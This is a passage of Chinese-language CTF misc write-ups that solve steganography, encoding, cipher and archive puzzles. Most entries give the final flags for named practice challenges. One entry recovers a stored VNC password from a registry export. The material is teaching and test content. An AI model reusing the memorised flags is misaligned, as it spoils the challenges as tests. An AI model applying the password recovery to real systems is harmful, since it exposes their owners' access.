&#39;i&#39;: 80, &#39;5&#39;: 70, &#39;F&#39;: 50, &#39;U&#39;: 40, &#39;n&#39;: 30, &#39;!&#39;: 20, &#39;&#125;&#39;: 10&#125;)\nflag_{M1Sc5FUn!}\n2\nxxx\n一个没有后缀名的文件，常规操作查看十六进制。\n看到压缩包的文件头，手动分离后，得一个加密压缩包，里面有一个doc文件“你找flag吗”，下一步就是找压缩包的密码了！\n对第一部分数据做处理，尝试base64解密，得\nWindows Registry Editor Version 5.00[HKEY_CURRENT_USER\\Software\\RealVNC][HKEY_CURRENT_USER\\Software\\RealVNC\\vnclicensewiz]&quot;_AnlClientId&quot;&#x3D;&quot;8f5cc378-2e1d-4670-80e0-d2d81d882561&quot;&quot;_AnlSelected&quot;&#x3D;&quot;0&quot;&quot;_AnlInclRate&quot;&#x3D;&quot;0.0025&quot;[HKEY_CURRENT_USER\\Software\\RealVNC\\vncserver][HKEY_CURRENT_USER\\Software\\RealVNC\\VNCViewer4]&quot;dummy&quot;&#x3D;&quot;&quot;[HKEY_CURRENT_USER\\Software\\RealVNC\\VNCViewer4\\MRU]&quot;00&quot;&#x3D;&quot;127.0.0.1&quot;&quot;Order&quot;&#x3D;hex:00,01&quot;01&quot;&#x3D;&quot;127.0.0.1:5900&quot;[HKEY_CURRENT_USER\\Software\\RealVNC\\WinVNC4]&quot;Password&quot;&#x3D;hex:37,5e,be,86,70,b3,c6,f3&quot;SecurityTypes&quot;&#x3D;&quot;VncAuth&quot;&quot;ReverseSecurityTypes&quot;&#x3D;&quot;None&quot;&quot;QueryConnect&quot;&#x3D;dword:00000000&quot;PortNumber&quot;&#x3D;dword:0000170c&quot;LocalHost&quot;&#x3D;dword:00000000&quot;IdleTimeout&quot;&#x3D;dword:00000e10&quot;HTTPPortNumber&quot;&#x3D;dword:000016a8&quot;Hosts&quot;&#x3D;&quot;+,&quot;&quot;AcceptKeyEvents&quot;&#x3D;dword:00000001&quot;AcceptPointerEvents&quot;&#x3D;dword:00000001&quot;AcceptCutText&quot;&#x3D;dword:00000001&quot;SendCutText&quot;&#x3D;dword:00000001&quot;DisableLocalInputs&quot;&#x3D;dword:00000000&quot;DisconnectClients&quot;&#x3D;dword:00000001&quot;AlwaysShared&quot;&#x3D;dword:00000000&quot;NeverShared&quot;&#x3D;dword:00000000&quot;DisconnectAction&quot;&#x3D;&quot;None&quot;&quot;RemoveWallpaper&quot;&#x3D;dword:00000000&quot;RemovePattern&quot;&#x3D;dword:00000000&quot;DisableEffects&quot;&#x3D;dword:00000000&quot;UseHooks&quot;&#x3D;dword:00000001&quot;PollConsoleWindows&quot;&#x3D;dword:00000001&quot;CompareFB&quot;&#x3D;dword:00000001&quot;Protocol3.3&quot;&#x3D;dword:00000000&quot;dummy&quot;&#x3D;&quot;&quot;\n头一次解除这样的文件，后来才知道这是注册表的内容，搜索了一把，发现与安恒月赛的部分相似\n下一步应对\n“Password”=hex:37,5e,be,86,70,b3,c6,f3\n进行VNC解密，密码为!QAZ2wsx\n压缩包解密后得一个很多换行符的word，又卡住了\n经提醒，与某一场比赛类似，doc改成zip，可得很多xml文件。word/document.xml打开，又愣了好久，\n在后半部分发现\n&lt;w:t&gt;MZWGCZ33GY4TQZBVGFQTCOLEHBQTCMRRMNSTKOBRGQ4TSZBXMI3TAMJWGY4H2===&lt;/w:t&gt;\n试试一把梭\nbase32:\nb’flag{698d51a19d8a121ce581499d7b701668}’\n3\nsrc：迷惑行为大赏（之）无中生you\n给了一个表情包和一个加密压缩包。\n555，又一筹莫展了。CTFshow问了好几个师傅，提示更改高度，得到了&quot;密码：没技术，是菜鸡&quot;，emmm\ntxt里是这样的\n‎‍​​​​​‍​​​​​​‍‏​​​​​‏‎​​​​​‏​​​​​​‍‏‌​​​​‎‍‌​​​​‏‌‍​​​​‎‍‎​​​​‌‏‏​​​​‍‌‍​​​​‎‍‌​​​​‎​‍​​​​‏‌‍​​​​‎‎​​​​​‏‏‍​​​​‎‎​​​​​‍‎‏​​​​‏​​​​​​‎‍‍​​​​‎‏‍​​​​‌‏‏​​​​‏​‎​​​​‏‏​​​​​‎​​​​​​‍​‌​​​​‍‎​​​​​‍​‍​​​​‎‍‌​​​​‍‏‌​​​​‏‌‎​​​​‎‍‌​​​​‎​‎​​​​‍‏‌​​​​‎‌‍​​​​‎​​​​​​‎‎​​​​​‏‍​​​​​‏​‎​​​​‌‏‏​​​​‎‎​​​​​‎‍​​​​​‏‌‎​​​​‏‌‍​​​​‎‌‏​​​​‏‌​​​​​‍‌‍​​​​‎‍‎​​​​‎‍‏​​​​‍​​​​​​‏‌‎​​​​‍‎‎​​​​‎‌‍​​​​‍​‌​​​​‎‍‌​​​​‍‎‍​​​​‎‏‍​​​​‍‎‎​​​​‍‎‌​​​​‎‍‎​​​​‎​‏​​​​‎‌‎​​​​‏‎‌​​​​‎​‌​​​​‎‍‌​​​​‍‎‎​​​​‎‍‌​​​​‎‌​​​​​‎‌‏​​​​‍​‌​​​​‏​‏​​​​‏‏​​​​​‎‌‏​​​​‌‏‎​​​​‍‌‌​​​​‍​​​​​​‎​‎​​​​‎‍​​​​​‏‍‌​​​​‍​‍​​​​‎‌‍​​​​‎‍​​​​​‏‎​​​​​‏‏​​​​​‎​‍​​​​‎‍​​​​​‍‏​​​​​‎​​​​​​‎​‎​​​​‎‍‍​​​​‏‍‍​​​​‏‎‌​​​​‎‍‍​​​​‍‏‌​​​​‍‎‏​​​​‍​‎​​​​‎‌‍​​​​‌‏‏​​​​‏‍‍​​​​‏‎‏​​​​‎‍‏​​​​‍​​​​​​‎‌‍​​​​‎‍‌​​​​‎‏‍​​​​‏‏‍​​​​‏​‏​​​​‎​​​​​​‎​‎​​​​‏‏‍​​​​‎​‎​​​​‎‌‏​​​​‎‌‎​​​​‏‌‏​​​​‍‏‏​​​​‎‏‍​​​​‎‌‍​​​​‍‎‏​​​​‏​​​​​​‏‏‌​​​​‎‍‌​​​​‎‍‌​​​​‏‌‎​​​​‎‍‌​​​​‎‎​​​​​‍‏‍​​​​‏‍‍​​​​‌‏‎​​​​‎‌‍​​​​‍​​​​​​‏​​​​​​‌‏‎​​​​‎‍‍​​​​‎‍‍​​​​‏‍‍​​​​‎‌‌​​​​‎‏‍​​​​‏‌‎​​​​‎​‎​​​​‍​‎​​​​‏​​​​​​‎‍​​​​​‍‏‏​​​​‎​‎​​​​‎‍‏​​​​‎‍‌​​​​‏‌‍​​​​‏‏‍​​​​‏​‌​​​​‎‍‎​​​​‏‍‌​​​​‏‎‏​​​​‎‌‎​​​​‌‏‏​​​​‎​‎​​​​‏‏​​​​​‎‍‏​​​​‏‌‍​​​​‏​‏​​​​‍​‎​​​​‎‌‎​​​​‍‎‏​​​​‌‏‏​​​​‍​​​​​​‎‍‌​​​​‍‎‏​​​​‏​‏​​​​‍‎‏​​​​‎‍‏​​​​‎‍‎​​​​‎‏‏​​​​‏‎‎​​​​‎‍‌​​​​‍‎‏​​​​‏​‏​​​​‏‎‎​​​​‎​‍​​​​‏‌‍​​​​‍‏‏​​​​‍‏​​​​​‎​‎​​​​‍​‌​​​​‏​‏​​​​‏‌‏​​​​‎‏‏​​​​‍‎‏​​​​‍‏‏​​​​‏‌‏​​​​‎‍‌​​​​‍‎‎​​​​‍‎‌​​​​‏‌‎​​​​‎‍‏​​​​‌‏‎​​​​‏‎​​​​​‏‏‌​​​​‎​​​​​​‍​‌​​​​‍‏​​​​​‍‏‏​​​​‎‍‏​​​​‏‏‍​​​​‏‌‎​​​​‍​‎​​​​‎‎​​​​​‍‎‏​​​​‏​​​​​​‏‌‎​​​​‎‍‌​​​​‍​​​​​​‏‎‏​​​​‌‏‏​​​​‎‍‌​​​​‏‌‌​​​​‏​‏​​​​‎‎​​​​​‎‏‏​​​​‍‏​​​​​‍‎​​​​​‏‏​​​​​‎‌‎​​​​‏‏‍​​​​‍‎​​​​​‌‏‏​​​​‎‏‍​​​​‍​‌​​​​‍‏​​​​​‏‌‏​​​​‎‌‍​​​​‎‍​​​​​‏​‏​​​​‍‏‍​​​​‎‍​​​​​‏‌‌​​​​‎‌‌​​​​‌‏‎​​​​‎‏‎​​​​‏‌‏​​​​‏‏​​​​​‎​‎​​​​‎‌‏​​​​‍‎‏​​​​‍‎‏​​​​‏‏‌​​​​‎‎​​​​​‍‎‎​​​​‎‎​​​​​‏​‏​​​​‎​‍​​​​‌‏‏​​​​‎‎​​​​​‎‌​​​​​‎‏‎​​​​‎‍‌​​​​‎‍‌​​​​‎‏‍​​​​‎​‎​​​​‏‌‍​​​​‏​‎​​​​‍​‍​​​​‎‍‌​​​​‌‏‎​​​​‏‏​​​​​‎‍‌​​​​‎‍​​​​​‌‏‏​​​​‏‌‎​​​​‏​‏​​​​‎​‌​​​​‍​‌​​​​‎​‎​​​​‏‍‎​​​​‏​​​​​​‍‎‎​​​​‎‍‌​​​​‍​‏​​​​‎‌‏​​​​‍‏​​​​​‎‍‌​​​​‌‏‎​​​​‎‏‎​​​​‎‌‏​​​​‎​‍​​​​‍​‎​​​​‎‍​​​​​‎‍​​​​​‏‌‎​​​​‏‍‌​​​​‎‏‍​​​​‏‌‌​​​​‏​​​​​​‏‌‍​​​​‎‏‎​​​​‎‌‏​​​​‏‌‎​​​​‏‎‍​​​​‎‎​​​​​‏‌‎​​​​‏‌‍​​​​‍​‎​​​​‎‏‏​​​​‍‎‏​​​​‍‏​​​​​‍​‏​​​​‎​‍​​​​‍‏‍​​​​‍‏‏​​​​‎‍‌​​​​‎‏‏​​​​‍​‌​​​​‎‍‌​​​​‏‎​​​​​‎‏‏​​​​‍‎‎​​​​‏​​​​​​‍‏‎​​​​‎‏‏​​​​‏‌‏​​​​‏‌‎​​​​‏‎‏​​​​‎‍​​​​​‏‌‎​​​​‎​‎​​​​‍‏‏​​​​‎​‏​​​​‎‍‍​​​​‍‏‏​​​​‎‍​​​​​‎‌‍​​​​‍‏‌​​​​‏‏​​​​​‌‏‏​​​​‎‏‏​​​​‎‍‎​​​​‎​‍​​​​‏‎‎​​​​‎‍​​​​​‏‍​​​​​‎‍‌​​​​‎‍‍​​​​‎‏‏​​​​‏‍​​​​​‏‌‎​​​​‍‏‌​​​​‎‎​​​​​‍‏‍​​​​‏‍‍​​​​‎​‌​​​​‎‍‍​​​​‎‌‎​​​​‍‌‍​​​​‏‌‍​​​​‎‍​​​​​‌‏‎​​​​‏‎‏​​​​‍​​​​​​‎‍​​​​​‍​​​​​​‏‍‍​​​​‎‍​​​​​‎‌‏​​​​‏‌‏​​​​‏‎‌​​​​‏‏‌​​​​‎‍​​​​​‏‏‍​​​​‎‍‌​​​​‏‍‍​​​​‎‏‎​​​​‍​‌​​​​‍‏​​​​​‏‍‎​​​​‎‌‌​​​​‏‌‌​​​​‎‌‌​​​​‌‏‏​​​​‎​‌​​​​‌‏‎​​​​‏‌‎​​​​‎‌​​​​​‎​‎​​​​‎‍‎​​​​‎​‍​​​​‍​​​​​​‎‍​​​​​‍​​​​​​‏‌‎​​​​‍‎‌​​​​‎‍‍​​​​‍‎‏​​​​‏‎‏​​​​‏‎‎​​​​‎‌‌​​​​‏‌‍​​​​‏‍‍​​​​‍‏‏​​​​‎‍‌​​​​‎‍‍​​​​‎‏‏​​​​‏‏‍​​​​‎‎​​​​​‍​​​​​​‏‎‌​​​​‌‏‎​​​​‎​‍​​​​‍‎‎​​​​‎​‎​​​​‏​‏​​​​‎​‍​​​​‏‌‏​​​​‎‌‍​​​​‏‍​​​​​‎​‍​​​​‍‎‏​​​​‍‏‏​​​​‎‎​​​​​‎‌‎​​​​‍‏‌​​​​‍‏‏​​​​‎‌​​​​​‎‌‎​​​​‏‌‍​​​​‍‏​​​​​‏​‏​​​​‏​​​​​​‍‎‎​​​​‏‌‎​​​​‎‍‌​​​​‎‌‌​​​​‍​​​​​​‎‍‌​​​​‍‎‏​​​​‎‎​​​​​‍​‌​​​​‍‎‌​​​​‎​‏​​​​‏​‌​​​​‎‍​​​​​‍‏​​​​​‎​‌​​​​‎‎​​​​​‌‏‏​​​​‎‌‍​​​​‎‍‍​​​​‎‏‎​​​​‎‌‎​​​​‍‌‌​​​​‏‏​​​​​‎​‎​​​​‎‍‎​​​​‎​‎​​​​‍​‌​​​​‎‍‍​​​​‎‍​​​​​‏‍‍​​​​‎‍‍​​​​‏​​​​​​‎‍‍​​​​‏​‏​​​​‎‌‏​​​​‎‍​​​​​‌‏‏​​​​‏‌‎​​​​‎​‎​​​​‎‍​​​​​‍​‌​​​​‏‍‍​​​​‏‍‍​​​​‎‌‍​​​​‏‏‍​​​​‎‍‌​​​​‎‍‍​​​​‎‌‏​​​​‎‌‏​​​​‎‌‍​​​​‍​‏​​​​‎‌‍​​​​‏‌‏​​​​‎‍‌​​​​‍‏‌​​​​‎‏‍​​​​‍‎‎​​​​‏​‏​​​​‏‍‍​​​​‎‍‍​​​​‍‎‎​​​​‍‎‌​​​​‏‌‍​​​​‎​​​​​​‍​​​​​​‌‏‎​​​​‌‏‎​​​​‎‌‏​​​​‏‌​​​​​‏‎‌​​​​‏‍‌​​​​‏​​​​​​‍‎‎​​​​‎​‎​​​​‏‍​​​​​‏​‌​​​​‎‍‍​​​​‏​‏​​​​‎‍‌​​​​‎‏‏​​​​‍‎‎​​​​‏​‏​​​​‎‏‍​​​​‎‌‎​​​​‍‏‌​​​​‏​​​​​​‎‏‍​​​​‎​​​​​​‌‏‏​​​​‏​‏​​​​‏‏​​​​​‎​‍​​​​‏‌‏​​​​‎‌‍​​​​‏‍‌​​​​‎‏‍​​​​‏‌‌​​​​‍‏​​​​​‏‌‍​​​​‎‏‏​​​​‌‏‏​​​​‎‎​​​​​‎‌‌​​​​‎​‍​​​​‎‍‌​​​​‎‎​​​​​‎‏‍​​​​‎‍​​​​​‍​​​​​​‎‎​​​​​‏‍‌​​​​‎‍​​​​​‏‌‍​​​​‍‎‏​​​​‍​‌​​​​‎‌‏​​​​‏‏‍​​​​‎‌‍​​​​‎‌‍​​​​‏​​​​​​‏‌‏​​​​‍​‎​​​​‎​‌​​​​‏​​​​​​‍‏‌​​​​‍‏‏​​​​‍‏‎​​​​‏​‌​​​​‍‎‎​​​​‍‎‏​​​​‍​‎​​​​‎‌‍​​​​‍‎‏​​​​‏​​​​​​‎‌‍​​​​‎‌‏​​​​‌‏‎​​​​‍‌‍​​​​‏‎‎​​​​‎​‎​​​​‏‍​​​​​‏​​​​​​‏‌‎​​​​‎‎​​​​​‌‏‏​​​​‏‍‍​​​​‏‏​​​​​‎​‏​​​​‎‍‎​​​​‎‎​​​​​‏‎‍​​​​‎‌‍​​​​‍‎‎​​​​‎‎​​​​​‏‌‌​​​​‎‏‍​​​​‎‍‌​​​​‏‌‎​​​​‍‎‎​​​​‎‏‏​​​​‍‏​​​​​‏‌‎​​​​‏‎‌​​​​‎‍‍​​​​‎‍​​​​​‏‍‍​​​​‎‍‏​​​​‎‏‏​​​​‏‌‏​​​​‎​‍​​​​‏‎‎​​​​‎‏‍​​​​‍‏​​​​​‏‍‍​​​​‎‌‎​​​​‎‍​​​​​‎‍‌​​​​‍‎​​​​​‍​‍​​​​‎‍‍​​​​‍‏‍​​​​‏​​​​​​‎‍‏​​​​‎‌‍​​​​‎‌‏​​​​‎​‎​​​​‏​‏​​​​‎‎​​​​​‏‍​​​​​‏​‏​​​​‏‎‌​​​​‏​​​​​​‎‍‍​​​​‏‍‍​​​​‎‌‌​​​​‎‌‎​​​​‍‎‏​​​​‍‌‌​​​​‏‎‏​​​​‎​‏​​​​‍‎‏​​​​‏‍‍​​​​‍‏‏​​​​‎‎​​​​​‏‌‏​​​​‏​‏​​​​‎‏‍​​​​‎​‍​​​​‏‌‍​​​​‎​‎​​​​‍‎‍​​​​‏​‌​​​​‎‍‎​​​​‎‎​​​​​‏‏‌​​​​‎‏‏​​​​‏‌‌​​​​‎‌‌​​​​‍​​​​​​‎‏‍​​​​‌‏‏​​​​‍‎‌​​​​‎‌​​​​​‎‌‍​​​​‍​​​​​​‏‎​​​​​‍‍‌\n0宽度字符解密\n得到一串字符串\nU2FsdGVkX19VMkZzZEdWa1gxK3A4VGlVNGRKZng1ZUlkTi9XY2lDR3VCaDBXOStLVDVPT3hxT082NUo4RUsxMUFKNWptWGE5R1pwY2RVazhKNzNTSmJaREdyVVlVZHp0R2d0WWpQalN5dUJNYVkzeXowS1NxYkh5SE12VEhEYXcvVEhvMkJFN3hmcEJmVDBlY0syK3FJYzl5ZEdlV2w1VjhZcFAxSzA1a3FmRUhHUjQ0bmxNTEEyZDZhM1ZPbVVaNkg4V0xVU1lhL3NqdDV6TFV0bTM5UUloajdkbTluZlk5cEF6MHJVc3VscDdIcmlwUlNJOWJURGx1cXMvUnVWcnlGZHpLWS9kU0w2U2pUTmtyUzVpb3FqQjQ1L0lPNXM2U2lBWEwvQkpJVWczZ2t0MDNhMmRnMEJZSGJPSkFhdDlVQ2VEZ3BOeUFLZ1RWbS8xNXN3WUpWdWhTU1lNU3ppRzVWTTR6RmVGaDhpWDBkK200TitodDNneWhVcDhaSGdaK1hxMmRoajFkc1ZQMVZaU2ZoUkE3TzRRdm5LdGJIeDE5REdRT09vNndlZ1pxOXZuRDZjaVlDcFltWUpYcmMvaFpSUVA4WHdYRTNhZnhtdWpQSE8wOEpJZmhaMkNCeXZycjQ2a1BPR2s&#x3D;\nbase一把梭\nbase64:b&#39;Salted__U2FsdGVkX1+p8TiU4dJfx5eIdN&#x2F;WciCGuBh0W9+KT5OOxqOO65J8EK11AJ5jmXa9GZpcdUk8J73SJbZDGrUYUdztGgtYjPjSyuBMaY3yz0KSqbHyHMvTHDaw&#x2F;THo2BE7xfpBfT0ecK2+qIc9ydGeWl5V8YpP1K05kqfEHGR44nlMLA2d6a3VOmUZ6H8WLUSYa&#x2F;sjt5zLUtm39QIhj7dm9nfY9pAz0rUsulp7HripRSI9bTDluqs&#x2F;RuVryFdzKY&#x2F;dSL6SjTNkrS5ioqjB45&#x2F;IO5s6SiAXL&#x2F;BJIUg3gkt03a2dg0BYHbOJAat9UCeDgpNyAKgTVm&#x2F;15swYJVuhSSYMSziG5VM4zFeFh8iX0d+m4N+ht3gyhUp8ZHgZ+Xq2dhj1dsVP1VZSfhRA7O4QvnKtbHx19DGQOOo6wegZq9vnD6ciYCpYmYJXrc&#x2F;hZRQP8XwXE3afxmujPHO08JIfhZ2CByvrr46kPOGk&#39;\n其中’Salted__'是网站自带的，去掉。\nTriple DES解密后\n\nSNOW.EXE -C -p “没技术，是菜鸡” 文件\n得flag{l0ts_0f_???}\n3\nchallenge.wav： 记得给我打电话\n电话音参考网站DTMF Tone，\n\n45774391614390919680552035340229102217126562041792203410479326635706552497458\n&gt;&gt;&gt; print(hex(num))0x6533633533636265633936656138626465306332393465353230623337613532\n十六进制转字符串\ne3c53cbec96ea8bde0c294e520b37a52\nflag包裹即可\n4\n2020太湖杯：misc\n分离出压缩包后得：\nU2FsdGVkX194m4B5HqBSGYPLTS4bywdKDJh13lrSj&#x2F;OcwgSAoHBw9X&#x2F;p2IdEtGx7EdJFR6rcjyPA+M+aKLZvqE7h7EBFA5LyHYk&#x2F;5Cns4LV02vM7Dk+T70FlWOlJ3XeA9pJwFdAWzeN&#x2F;0A74u+hLG&#x2F;oLF1g3djo77yVTCBCs0r7khTOWahv0SYR33tHSq3YzJGTBS1Zsj2i&#x2F;sGC8tTnNfsLl0SQ2JeTJhP&#x2F;aNU2LmPVTyc3y4kTx+ysw8vasHwenWoBXFtOe2WkorJOCrqdQ8Qqd78TzZ0jRMv6MJO2ytUy&#x2F;3mebHU9LAlWKFluNEh5t&#x2F;cUVvtigLS6PquYRX5ziEx52HDkW+WgfRnum&#x2F;AregLJ4c4f6AvG2gBjHVKO6sGEiuh59jcyN1SvsQEvXd7cOD&#x2F;KWZjE5gqVGUJqXyhauqWPVYUlcuHH6abtQwNuDb+jZxMg5QaDzwPhpGRly7NhKU5OgCdhdK17TX7z2&#x2F;RuNYj6pyfRYNZmQdOFl9B28+lawKO8l5b18WF5JV6chou7riwwDLqQrKMDjUUKZUtdMn0ReDQbR8reeqw&#x2F;u+Lkyhl6w+222QWgQ2yRd2dhHb1kqNncUInAEqTPNKRBnia8F&#x2F;+FycBv+KAwCFPwx9oNTFBYN4EJL&#x2F;RjiXEkkSCnyH48VynuuOeX2uNlAti214mCbWWH+pxLn4PHIWf3JK819kiDcjqyQ5y3v+EUEr9Sb1WVwiITDW5XtzVP+Yr&#x2F;IJ0ikl41zMu9BAQPermoa8hZJdE8mb3oSet+pAM7PtnyI7FGJ5Ynkpq05AiJMrN+UgV0E&#x2F;ELc0UhWw3O0c4u+eYtQkzu&#x2F;9+UCRy1Fi+QWFlO3cuWBA4GMGTE1FHWnqnZ683FwrM5bcb6TTu3&#x2F;Q5sppFmqNrOX+ctx5b5xiYeSZ8XFI2ks6L7aFrQYu833GiERnIiZEX8vFqjdnD+tcuQ6Zg9Z7oxhATDP9H5d1e9IaxwOA&#x2F;fDP0qvdKJ+OS5OPljnboywCPp7QqFHZfyC7d2GIraadSOL+eIwfavCqgfGwpWMW5H359IKZASi&#x2F;HexzEcYrA7OZ8GzSxO9Lmk&#x2F;ea4BD4JD2lawEIiDE7yhJApimzJ4IG8EMXFn&#x2F;rOM3O2PkuSTKFsXu7&#x2F;XZ3ozAJsPun5RJcMuUFXQX++DqXqe6Kbo&#x2F;hEKwHETq0VbL6qEKkQKf5ce3i6tuZG8OqqPsye0Ku5D2LREqqGGysshULZWmvlx4u2FUtj4Xg&#x3D;&#x3D;waoootu.epj.nv owww.verymuch.netWish everybody have fun!!!!!!\n希尔密码：\n密文：\nwaoootu.epj.nv o\n密钥：\nwww.verymuch.net\n明文：\nlove and peaceee\nrabbit解密：\n密文：\n上述类base64\n密钥：\nlove and peaceee\n明文：\nn卡住了，傻逼\nbase32:\n\\u65b0\\u4f5b\\u66f0\\uff1a\\u8af8\\u96b8\\u54c9\\u50e7\\u964d\\u543d\\u8af8\\u9640\\u6469\\u96b8\\u50e7\\u7f3d\\u85a9\\u54a4\\u8028\\u8af8\\u96b8\\u6167\\u585e\\u8272\\u5c0a\\u54c9\\u8fe6\\u8ae6\\u7a7a\\u6240\\u964d\\u6211\\u5ff5\\u96b8\\u7957\\u8ae6\\u5ff5\\u54c9\\u9640\\u56b4\\u54c9\\u56c9\\u4fee\\u5937\\u963f\\u6ce2\\u8272\\u838a\\u5bc2\\u8ae6\\u585e\\u5492\\u838a\\u773e\\u6211\\u54c9\\u6240\\u4f0f\\u805e\\u85a9\\u96b8\\u610d\\u95cd\\u5436\\u6240\\u4fee\\u662f\\u8272\\u6469\\u8a36\\u56b4\\u54c9\\u9858\\u610d\\u54c9\\u5373\\u4fee\\u54c9\\u7a7a\\u871c\\u9640\\u56c9\\u4f0f\\u5ff5\\u54c9\\u6469\\u54c9\\u4ea6\\u838a\\u54c9\\u773e\\u54a4\\u5982\\u9858\\u5982\nunicode解密：\n新佛曰：諸隸哉僧降吽諸陀摩隸僧缽薩咤耨諸隸慧塞色尊哉迦諦空所降我念隸祗諦念哉陀嚴哉囉修夷阿波色莊寂諦塞咒莊眾我哉所伏聞薩隸愍闍吶所修是色摩訶嚴哉願愍哉即修哉空蜜陀囉伏念哉摩哉亦莊哉眾咤如願如\n新佛曰解密：\nLive beautifully, dream passionately, love completely.\n压缩包解密得fun.wav,调成频谱图后，得\nflag{m1sc_1s_funny2333}\n5\n[BJDCTF 2nd]TARGZ-y1ng\n\n哎？ 我的tar zxvf怎么不好使了？\n解压密码不需要爆破\n得到的 flag 建议用 flag{} 包上提交。\n\n得到一名为hW1ES89jF.tar.gz，由于题干说解压密码不需要爆破，尝试后发现上一级的压缩包名为下一级的密码。\n本想手分，但是太麻烦了，学着写脚本。\n更改之后的脚本如下：\nimport zipfile,osdef unzip(zipname):    while True:        passwd &#x3D; zipname.split(&#39;.&#39;)[0]#hW1ES89jF        zf &#x3D; zipfile.ZipFile(zipname,&#39;r&#39;)        zf.extractall(pwd&#x3D;passwd.encode())        zf.close()#一定要关闭，否则会报错进程重复        os.remove(zipname)#关闭已经处理过的压缩包        zipname &#x3D; zf.namelist()[0]        zf.close()unzip(&quot;hW1ES89jF.tar.gz&quot;)#BJD&#123;wow_you_can_rea11y_dance&#125;\n6\n[HBNIS2018]excel破解\n\n得到的 flag 请包上 flag{} 提交。来源：https://github.com/hebtuerror404/CTF_competition_warehouse_2018\n\n得到一xls表格，更改后缀名为zip/rar，十六进制查看，搜索flag得\n\nflag&#123;office_easy_cracked&#125;\n7\n[SWPU2019]伟大的侦探\n\n得到的 flag 请包上 flag{} 提交。\n\n下载得到一部分加密得压缩包。密码.txt和名为misc的文件夹。\n密码.txt👇\n压缩包密码:摂m墷m卪倕ⅲm仈Z呜呜呜,我忘记了压缩包密码的编码了,大家帮我解一哈。\n拖进010editor中改变编码方式（为了避免混淆，删除语句中可能形成干扰的部分）\n最后在EBCDIC编码中发现可能的语句\n\nwllm_is_the_best_team!\n解压压缩包，得到一些跳舞的小人👇\n\n1 2 3 4 5 6 3 2 9 5 11 12 13 14 15 2 2 9\n尝试第一种方法：\n在英文中，e的使用频率最高，而这18张图中2的使用频率最高：\n2-&gt;e\n试着对应起来：\nxxexxx\nxexxxx\nxxxeex\n感觉不可能。\n第二种方法：\n搜索引擎搜索“小人密码”，发现为福尔摩斯中出现过的一种解密方法👇\n\n试着对应起来：\niloveh\nolmesa\nndwllm\nflag{iloveholmesandwllm}\n8\n[WUSTCTF2020]find_me\n\n得到的 flag 请包上 flag{} 提交。感谢 Iven Huang 师傅供题。比赛平台：https://ctfgame.w-ais.cn/\n\n右键查看文件的详细信息或者EXIFTOOL查看元数据👇\n⡇⡓⡄⡖⠂⠀⠂⠀⡋⡉⠔⠀⠔⡅⡯⡖⠔⠁⠔⡞⠔⡔⠔⡯⡽⠔⡕⠔⡕⠔⡕⠔⡕⠔⡕⡍&#x3D;\n盲文在线解密网站：\nhttps://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen\n9\n\n\n得到的 flag 请包上 flag{} 提交。感谢Galaxy师傅供题。\n\n得到一个损坏的压缩包。十六进制查看后发现文件头损坏\nRAR正确文件头如下：\n0000h: 52 61 72 21  Rar!\n得到你能看懂音符吗.docx，由于笔者默认打开所有隐藏字符，故能直接看到隐藏字符。可以猜测为音符编码\n无法复制，更改后缀为.zip，\\word\\document.xml中能得到该文档的内容信息：\n&lt;w:t&gt;♭♯♪‖¶♬♭♭♪♭‖‖♭♭♬‖♫♪‖♩♬‖♬♬♭♭♫‖♩♫‖♬♪♭♭♭‖¶∮‖‖‖‖♩♬‖♬♪‖♩♫♭♭♭♭♭§‖♩♩♭♭♫♭♭♭‖♬♭‖¶§♭♭♯‖♫∮‖♬¶‖¶∮‖♬♫‖♫♬‖♫♫§&#x3D;&lt;&#x2F;w:t&gt;...&lt;w:t&gt;这都让你发现了，可是你能看懂吗？&lt;&#x2F;w:t&gt;\n找到了在线音乐符号解密的网站\nMRCTF&#123;thEse_n0tes_ArE_am@zing~&#125;\n10\n\n\n得到的 flag 请包上 flag{} 提交。\n\n555,我讨厌拼图，giao\n得到压缩包里很多无后缀的文件。通过010editor，可得这些都为jpg文件。\n打开得到碎片化的二维码。拼！\n\n人都傻了，得到\nBASE Family Bucket ??? 85-&gt;64-&gt;85-&gt;13-&gt;16-&gt;32\n根据提示，一步一步来吧。中间还用到了rot13\n得ThisIsSecret!233\n打开压缩包，得到flag\nflag&#123;Qr_Is_MeAn1nGfuL&#125;\n11\n\n\n得到的 flag 请包上 flag{} 提交。\n\n0086 1562 2535 5174bnhn s wwy vffg vffg rrhy fhnv请将你得到的这句话转为md5提交，md5统一为32位小写。提交格式：flag&#123;md5&#125;\n之前做过类似的题，那道题为&quot;计算机要从娃娃抓起&quot;，用到了中国电码。试试看\n第一排数字正好对应中国电码中的“人工智能”\n第二排两个重复的vffg猜测为“娃娃”\n另，若熟悉五笔打字的话，就能知道第二行其实是五笔编码“也要从娃娃抓起”\n“人工智能也要从娃娃抓起”的32位小写md5就是\n3b4b5dccd2c008fe7e2664bd1bc19292\n12\n]\n\n得到的 flag 请包上 flag{} 提交。\n\nd4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd\n十六进制丢进010editor中，未果。\n进制转换，得\n212 232 225 244 160 247 225 243 160 230 225 243 244 161 160 212 232 229 160 230 236 225 231 160 233243186160196196195212198251185178178225226185185183180225180183227228179178178227230180179226181176182177176230225229225181253\n未见有意义字符串。\n对128取余试试，212-》84-》T\n成了，依次操作得\nThat was fast! The flag is: DDCTF&#123;922ab9974a47cd322cf43b50610faea5&#125;\n13\n\n\n小易的U盘中了一个奇怪的病毒，电脑中莫名其妙会多出来东西。小易重装了系统，把U盘送到了攻防实验室，希望借各位的知识分析出里面有啥。请大家加油噢，不过他特别关照，千万别乱点他U盘中的资料，那是机密。 注意：得到的 flag 请包上 flag{} 提交\n\n额，这道题还挺啊这的。\n一开始以为是流量分析啥的，后来发现二进制查看就是个压缩包，还原rar后缀名。\n得到一串exe和一堆有的没的（例如不要在上班时间打开的某雷链接\n找到autorun.inf,写着\n[AutoRun]Open&#x3D;autoflag - 副本 (32)\n把autoflag - 副本 (32).exe放进ida，main函数直接得flag\nflag&#123;29a0vkrlek3eu10ue89yug9y4r0wdu10&#125;\n14\n\n\n注意：得到的 flag 请包上 flag{} 